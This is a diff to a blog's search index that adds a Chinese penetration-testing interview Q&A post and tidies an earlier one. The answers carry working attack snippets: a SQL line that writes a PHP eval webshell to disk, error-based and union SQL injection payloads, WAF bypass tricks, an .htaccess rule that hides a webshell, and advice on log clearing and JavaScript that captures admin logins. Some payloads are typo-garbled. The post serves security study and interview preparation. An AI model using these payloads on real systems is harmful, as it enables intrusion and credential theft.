@@ -1,8 +1,181 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>渗透测试面试总结(二)</title>
+    <url>/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%BA%8C)/</url>
+    <content><![CDATA[<p>关于面试的一些总结。</p>
+<a id="more"></a>
+
+<p><strong>1.在windows 2013 服务器中建立一个<code>.zhongzi</code>文件夹的意义是什么</strong></p>
+<p>隐藏文件夹 不让管理员发现上传的木马或者软件</p>
+<p><strong>2.sql注入有以下两个测试选项，选择一个并且阐述不选择另一个的理由</strong> </p>
+<p>A：demo.jsp?id=2+1  B：demo.jsp?id=2-1</p>
+<p>选择B 因为在URL编码中+代表着连接符可能会混淆</p>
+<p><strong>3.以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路?</strong></p>
+<p><code>demm.do?DATA=AjAxNg==</code> DATA有可能经过了base64编码所以我们在bypass的时候要对自己的payload进行base64编码</p>
+<p><strong>4.<code>demo.jsp?uid=110</code>注入点，你有哪几种思路获取webshell 哪种是优选 ？</strong></p>
+<p>1.有写入权限，构造联合查询语句使用 <code>using INTO OUTFIELE</code>，可以将查询的输出重定向到系统的文件中，这样去写webshell </p>
+<p>2.使用sqlmap-os–shell原理和上面的一种相同，来直接获得一个shell，这样效率更高。</p>
+<p>3.通过构造联合查询语句得到网站管理员的账户密码，然后扫后台，登陆后台后通过上传一些手段获取webshell。</p>
+<p><strong>5.CSRF和XSS XXE有什么区别，以及修复方式</strong></p>
+<p>1.xss是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息的攻击。</p>
+<p>修复方式: 对字符实体进行转义，使用HTTP Only来禁止javascript来读取Cookie的值，输入时校验，浏览器与Ｗｅｂ应用端采取相同的编码格式。</p>
+<p>２.csrf跨站请求伪造攻击。xss是实现csrf的诸多手段的一种，是由于没有在关键操作执行的时候没有判断是不是用户自愿进行的操作。</p>
+<p>修复方式：筛选出需要防范的CSRF的页面然后嵌入Token，再次输入密码，检验Referer</p>
+<p>3.XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程的内容，和远程文件保护类似。会引发相关的安全问题，例如敏感文件读取。</p>
+<p>修复方式:XML解析库在调用时严格禁止对外部实体的解析</p>
+<p><strong>6.CSRF，SSRF和重放攻击有什么区别？</strong></p>
+<p>CSRF是由客户端发起 SSRF是服务器发起 重放攻击是将截获的数据包进行重放攻击，达到身份认证的目的。</p>
+<p><strong>7.至少说出三种业务逻辑漏洞，以及修复方式</strong></p>
+<p>1.密码找回漏洞中存在密码允许暴力破解，存在通用型找回凭证，可以跳过验证步骤，找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码</p>
+<p>2.身份认证漏洞中最常见的是会话固定攻击和Cookie仿冒只要得到Session或者Cookie即可伪造用户身份</p>
+<p>3.验证码漏洞中存在验证码允许暴力破解，验证码可以通过js或者改包的方式进行绕过。</p>
+<p><strong>8.圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world!” </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: ***com:82</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) </span><br><span class="line">Gecko/20100101 Firefox/45.0</span><br><span class="line">Accept: text/css,/;q=0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://*******com:82/eciop/orderForCC/cgtListForCC.htm?zone</span><br><span class="line">=11370601&amp;v=1459663591817</span><br><span class="line">Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d; </span><br><span class="line">uniqueuserid=session_0GRMiFiYJhAh5_HZrQoZamJ; </span><br><span class="line">st_uid=N90pIYHLZgjXI-NX01vPUf46w952J-0NcX19vgj1L%3DJXrZP9sf0I</span><br><span class="line">Y-vEI9iNIX150iLXKat1YZLnUf46Z%2C5aec5biM5rCROueDn%2BWPsOeD</span><br><span class="line">n%2BiNiTrng5%2Flj7A%3D; status=True</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>标红 1：sql 注入，标红 2：xss，标红 3：cookies 欺骗，4：会话 CSRF 或重放风险。考对 HTTP 数据包字段敏感度及会话渗透经验。</p>
+<p><strong>9.找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？</strong></p>
+<p><strong>10.你常用的渗透工具有哪些，最常用的是哪个？</strong></p>
+<p>burpsuit,appscan,avwvs,sqlmap,fiddler 等</p>
+<p><strong>11.描述一个你深入研究过的 CVE 或 POC?</strong> </p>
+<p>如 cve-2017-11191 offcie 的 dde 漏洞</p>
+<p><strong>12.谈谈你经常关注的安全平台？</strong></p>
+<p>如，tools.net,90sec,先知社区，安全客，freebuf 等</p>
+<p><strong>13.给你一个网站你是如何来渗透测试的?</strong></p>
+<p>在获取书面授权的前提下：</p>
+<p>(1)信息收集，</p>
+<p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p>
+<p>2.查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p>
+<p>3.查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p>
+<p>4.查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh 弱口令等。</p>
+<p>5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php 探针</p>
+<p>6.google hack 进一步探测网站的信息，后台，敏感文件</p>
+<p>(2)漏洞扫描</p>
+<p>开始检测漏洞，如 XSS,XSRF,sql 注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+<p>(3)漏洞利用</p>
+<p>利用以上的方式拿到 webshell，或者其他权限</p>
+<p>(4)权限提升</p>
+<p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows低版本的漏洞，如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权</p>
+<p>(5)日志清理</p>
+<p>(6)总结报告及修复方案</p>
+<p>或者：</p>
+<p>1）信息收集</p>
+<p>a. 服务器的相关信息（真实 ip，系统类型，版本，开放端口，WAF 等）</p>
+<p>b. 网站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
+<p>c. whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p>
+<p>d. 子域名收集，旁站查询(有授权可渗透)，C 段等</p>
+<p>e. google hacking 针对化搜索，pdf 文件，中间件版本，弱口令扫描等f. 扫描网站目录结构，爆后台，网站 banner，测试文件，备份等敏感文件泄漏</p>
+<p>等</p>
+<p>i. 传输协议，通用漏洞，exp，github 源码等</p>
+<p>2）漏洞挖掘</p>
+<p>1&gt; 浏览网站，看看网站规模，功能，特点等</p>
+<p>2&gt; 端口，弱口令，目录等扫描</p>
+<p>3&gt; XSS，SQL 注入，命令注入，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p>
+<p>3）漏洞利用 | 权限提升</p>
+<p>a) mysql 提权，serv-u 提权，linux 内核版本提权等</p>
+<p>4）清除测试数据 | 输出报告</p>
+<p>i 日志、测试数据的清理</p>
+<p>ii 总结，输出渗透测试报告，附修复方案</p>
+<p>5) 复测</p>
+<p>验证并发现是否有新漏洞，输出报告，归档</p>
+<p><strong>14.sqlmap，怎么对一个注入点注入？</strong></p>
+<p>(1)如果是 get 型号，直接，sqlmap -u “诸如点网址”.(2)如果是 post 型诸如点，可以 sqlmap -u “注入点网址” –data=”post</p>
+<p>的参数”</p>
+<p>(3)如果是 cookie，X-Forwarded-For 等，可以访问的时候，用 burpsuite抓包，注入处用*号替换，放到文件里，然后 sqlmap -r “文件地址”</p>
+<p><strong>15.nmap，扫描的几种方式?</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种：Intense scan</span><br><span class="line"></span><br><span class="line">(nmap -T4 -A -v)</span><br><span class="line"></span><br><span class="line">一般来说，Intense scan可以满足一般扫描</span><br><span class="line"></span><br><span class="line">-T4 加快执行速度</span><br><span class="line"></span><br><span class="line">-A 操作系统及版本探测</span><br><span class="line"></span><br><span class="line">-v 显示详细的输出</span><br><span class="line"></span><br><span class="line">第二种：Intense scan plus UDP</span><br><span class="line"></span><br><span class="line">(nmap -sS -sU -T4 -A -v)</span><br><span class="line"></span><br><span class="line">即UDP扫描</span><br><span class="line"></span><br><span class="line">-sS  TCP SYN 扫描</span><br><span class="line"></span><br><span class="line">-sU  UDP 扫描</span><br><span class="line"></span><br><span class="line">第三种：Intense scan,all TCP ports</span><br><span class="line"></span><br><span class="line">(nmap -p 1-65536 -T4 -A -v)</span><br><span class="line"></span><br><span class="line">扫描所有TCP端口，范围在1-65535，试图扫描所有端口的开放情况，速度比较慢。</span><br><span class="line"></span><br><span class="line">-p 指定端口扫描范围</span><br><span class="line"></span><br><span class="line">第四种：Intense scan,no ping</span><br><span class="line"></span><br><span class="line">(nmap -T4 -A -v -Pn)</span><br><span class="line"></span><br><span class="line">非ping扫描</span><br><span class="line"></span><br><span class="line">-Pn 非ping扫描</span><br><span class="line"></span><br><span class="line">第五种：Ping scan</span><br><span class="line"></span><br><span class="line">(nmap -sn)</span><br><span class="line"></span><br><span class="line">Ping 扫描</span><br><span class="line"></span><br><span class="line">优点：速度快。</span><br><span class="line"></span><br><span class="line">缺点：容易被防火墙屏蔽，导致无扫描结果</span><br><span class="line"></span><br><span class="line">-sn ping扫描</span><br><span class="line"></span><br><span class="line">第六种：Quick scan</span><br><span class="line"></span><br><span class="line">(nmap -T4 -F)</span><br><span class="line"></span><br><span class="line">快速的扫描</span><br><span class="line"></span><br><span class="line">-F 快速模式。</span><br><span class="line"></span><br><span class="line">第七种：Quick scan plus</span><br><span class="line"></span><br><span class="line">(nmap -sV -T4 -O -F --version-light)</span><br><span class="line"></span><br><span class="line">快速扫描加强模式</span><br><span class="line"></span><br><span class="line">-sV 探测端口及版本服务信息。</span><br><span class="line"></span><br><span class="line">-O 开启OS检测</span><br><span class="line"></span><br><span class="line">--version-light 设定侦测等级为2。</span><br><span class="line"></span><br><span class="line">第八种：Quick traceroute</span><br><span class="line"></span><br><span class="line">(nmap -sn --traceroute)</span><br><span class="line"></span><br><span class="line">路由跟踪</span><br><span class="line"></span><br><span class="line">-sn Ping扫描，关闭端口扫描</span><br><span class="line"></span><br><span class="line">-traceroute 显示本机到目标的路由跃点。</span><br><span class="line"></span><br><span class="line">第九种：Regular scan</span><br><span class="line"></span><br><span class="line">规则扫描</span><br><span class="line"></span><br><span class="line">第十种：Slow comprehensive scan</span><br><span class="line"></span><br><span class="line">(nmap -sS -sU -T4 -A -v -PE -PP -PS80,443,-PA3389,PU40125 -PY -g 53 --script all)</span><br><span class="line"></span><br><span class="line">慢速全面扫描。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>16.sql 注入的几种类型？</strong></p>
+<p>(1)报错注入</p>
+<p>(2)bool 型注入</p>
+<p>(3)延时注入</p>
+<p>(4)宽字节注入</p>
+<p><strong>17.报错注入的函数有哪些？</strong></p>
+<p>(1)and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-</p>
+<p>(2)通过 floor 报错 向下取整</p>
+<p>(3)+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</p>
+<p>4)geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));</p>
+<p>(5)multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));</p>
+<p>(5)polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));</p>
+<p>(7)multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));</p>
+<p>(8)linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));</p>
+<p>(9)multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));</p>
+<p>(10)exp()select from test where id=1 and exp(~(select * from(select </p>
+<p>user())a));</p>
+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p>
+<p><strong>18.延时注入如何来判断？</strong></p>
+<p>(1)if(ascii(substr(“hello”, 1, 1))=104</p>
+<p><strong>(2) sleep(5), 1)</strong></p>
+<p><strong>19.盲注和延时注入的共同点？</strong></p>
+<p>都是一个字符一个字符的判断</p>
+<p><strong>20.如何拿一个网站的 webshell？</strong></p>
+<p>上传，后台编辑模板，sql 注入写文件，命令执行，代码执行，一些已经爆出的 cms 漏洞，比如 dedecms 后台可以直接建立脚本文件，wordpress 上传插件包含脚本文件 zip 压缩包等</p>
+<p><strong>21.sql 注入写文件都有哪些函数？</strong></p>
+<p>(1)select ‘一句话’ into outfile ‘路径’</p>
+<p>(2)select ‘一句话’ into dumpfile ‘路径’</p>
+<p>(3) <code>select &#39;&lt;?php eval($_POST[1]) ?&gt;&#39; into dumpfile &#39;d:\wwwroot\baidu.com\nvhack.php&#39;;</code></p>
+<p><strong>22.如何防止 CSRF?</strong></p>
+<p>(1)验证 referer</p>
+<p>(2)验证 token</p>
+<p>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
+<p><strong>23.owasp 漏洞都有哪些？</strong></p>
+<p>(1)SQL 注入防护方法：</p>
+<p>(2)失效的身份认证和会话管理</p>
+<p>(3)跨站脚本攻击 XSS</p>
+<p>(4)直接引用不安全的对象</p>
+<p>(5)安全配置错误</p>
+<p>(6)敏感信息泄露</p>
+<p>(7)缺少功能级的访问控制</p>
+<p>(8)跨站请求伪造 CSRF</p>
+<p>(9)使用含有已知漏洞的组件</p>
+<p>(1))未验证的重定向和转发</p>
+<p><strong>24.SQL 注入防护方法？</strong></p>
+<p>(1)使用安全的 API</p>
+<p>(2)对输入的特殊字符进行 Escape 转义处理(3)使用白名单来规范化输入验证方法</p>
+<p>(4)对客户端输入进行控制，不允许输入 SQL 注入相关的特殊字符</p>
+<p>(5)服务器端在提交数据库进行 SQL 查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
+<p><strong>25.代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
+<p>(1)代码执行：</p>
+<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
+<p>(2)文件读取：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
+<p>(3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<p><strong>26.img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</strong></p>
+<p>src 指定一个远程的脚本文件，获取 referer</p>
+<p><strong>27.img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径?</strong></p>
+<p>1,远程服务器修改 apache 配置文件，配置.jpg 文件以 php 方式来解析AddType application/x-httpd-php .jpg<code>&lt;img src=http://xss.tv/1.jpg&gt;</code> 会以 php 方式来解析</p>
+<p><strong>28.怎么绕过 WAF 注入和上传以及 xss？</strong></p>
+<p>(1)关键字可以用%（只限 IIS 系列），比如 select 可以 sel%e%ct。原理：网络层 waf 对 SEL%E%CT 进行 url 解码后变成 SEL%E%CT，匹配 select 失败，而进入 asp.dll 对 SEL%E%CT 进行 url 解码却变成 select。IIS 下的 asp.dll 文件在对 asp 文件后参数串进行 url 解码时，会直接过滤掉 09-0d（09 是 tab 键,0d是回车）、20（空格）、%(后两个字符有一个不是十六进制)字符。xss 也是同理。</p>
+<p>(2)内联注释。安全狗不拦截，但是安全宝、加速乐、D 盾等，看到/!/就 Fack了，所以只限于安全狗。比如：/!select*/</p>
+<p>(3)编码。这个方法对 waf 很有效果，因为一般 waf 会解码，但是我们利用这个特点，进行两次编码，他解了第一次但不会解第二次，就 bypass 了。腾讯waf、百度 waf 等等都可以这样 bypass 的</p>
+<p>(4)绕过策略如：伪造搜索引擎早些版本的安全狗是有这个漏洞的，就是把 User-Agent 修改为搜索引擎</p>
+<p>(5)插入关键目录 admin,dede,install 等目录绕过 360webscan360webscan脚本存在这个问题，就是判断是否为admin dede install 等目录，如果是则不做拦截</p>
+<p>GET /pen/news.php?id=1 union select user,password from mysql.user</p>
+<p>GET /pen/news.php/admin?id=1 union select user,password from mysql.user</p>
+<p>GET /pen/admin/..\news.php?id=1 union select user,password from mysql.user</p>
+<p>(6)multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数WAF。</p>
+<p>(7)参数绕过，复制参数，id=1&amp;id=1用一些特殊字符代替空格，比如在 mysql 中%0a 是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在 sqlserver 中可以用/**/代替空格</p>
+<p>(8)内联注释，文件上传，复制文件包一份再加一份在 form-data;后面增加一定的字符</p>
+<p><strong>29.既然宽字节注入可以绕过单引号过滤，那么怎么来修复呢？</strong></p>
+<p>宽字符：解 决方法：就是在初始化连接和字符集之后，使用 SET character_set_client=binary 来设定客户端的字符集是二进制的。修改Windows 下的 MySQL 配置文件一般是 my.ini，Linux 下的 MySQL 配置文件一般是 my.cnf，比如：mysql_query(“SETcharacter_set_client=binary”);。character_set_client 指定的是 SQL 语句的编码，如果设置为 binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。</p>
+<p><strong>30.列举出 oracle 注入获取管理员权限提权典型漏洞？</strong></p>
+<p>【漏洞名称】 </p>
+<p>sys.dbms_export_extension.get_domain_index_metadata 提</p>
+<p>升权限漏洞【影响平台】Oracle 8i / 9i / 10g / XE</p>
+<p>【风险等级】高【攻击需求】较低权限账号</p>
+<p>【造成危害】取得管理员权限</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>渗透测试面试总结(一)</title>
-    <url>/2019/12/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98/</url>
+    <url>/2019/12/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%B8%80)/</url>
     <content><![CDATA[<p>关于面试的一些总结。</p>
 <a id="more"></a>
 
@@ -62,11 +235,10 @@
 <p>查看编辑器的名称版本,然后搜索公开的漏洞</p>
 <p><strong>14.拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</strong></p>
 <p>能做的事情很多，用隐藏网马来举例子：</p>
-<p>插入&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p>
-</FilesMatch>
-
+<p>插入<code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p>
 <p>.jpg 文件会被解析成.php 文件</p>
-<p><strong>15.注入漏洞只能查账号密码？</strong>可脱裤，可上传 webshell,可执行命令</p>
+<p><strong>15.注入漏洞只能查账号密码？</strong></p>
+<p>可脱裤，可上传 webshell,可执行命令</p>
 <p><strong>16.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
 <p>是根据特征码，所以很好绕过</p>
 <p><strong>17.access 扫出后缀为 asp 的数据库文件，访问乱码。如何实现到本地利用?</strong></p>
@@ -79,11 +251,9 @@
 <p><strong>20.注入时可以不使用 and 或 or 或 xor，直接 order by 开始注入吗？</strong></p>
 <p>and/or/xor，前面的 1=1、1=2 步骤只是为了判断是否为注入点，如果已经</p>
 <p>确定是注入点那就可以省那步骤去</p>
-<p><strong>21:某个防注入系统，在注入时会提示：统检测到你有非法注入的行为。已记录</strong></p>
-<p><strong>您的 ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id=15 提交内</strong></p>
-<p><strong>容:and 1=1 如何利用这个防注入系统拿 shell？</strong> </p>
+<p><strong>21:某个防注入系统，在注入时会提示：统检测到你有非法注入的行为。已记录您的 ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id=15 提交内容:and 1=1 如何利用这个防注入系统拿 shell？</strong> </p>
 <p>在 URL 里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件</p>
-<p>了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a href="http://ytxiao.lofter.com/post/40583a_ab36540" target="_blank" rel="noopener">http://ytxiao.lofter.com/post/40583a_ab36540</a></p>
+<p>了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
 <p><strong>22.上传大马后访问乱码时，有哪些解决办法？</strong></p>
 <p>浏览器中改编码</p>
 <p><strong>23.审查上传点的元素有什么意义？</strong></p>
@@ -98,8 +268,8 @@
 <p>这就任意文件下载漏洞，在 file=后面尝试输入 index.php 下载他的首页文件，</p>
 <p>然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和</p>
 <p>数据库的地址。</p>
-<p><strong>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存</strong></p>
-<p><strong>在编辑器和 admin 目录。请问你的想法是？</strong>直接在网站二级目录/abc/下扫描敏感文件及目录</p>
+<p><strong>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和 admin 目录。请问你的想法是？</strong></p>
+<p>直接在网站二级目录/abc/下扫描敏感文件及目录</p>
 <p><strong>27.在有 shell 的情况下，如何使用 xss 实现对目标站的长久控制？</strong></p>
 <p>（1)后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如</p>
 <p>果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的</p>
@@ -114,7 +284,7 @@
 <p>改后缀名绕过</p>
 <p><strong>30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
 <p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12 看</p>
-<p>HTML 体部 比如护卫神就可以在名称那看到<hws>内容<hws></p>
+<p>HTML 体部 比如护卫神就可以在名称那看到<code>&lt;hws&gt;内容&lt;hws&gt;</code></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
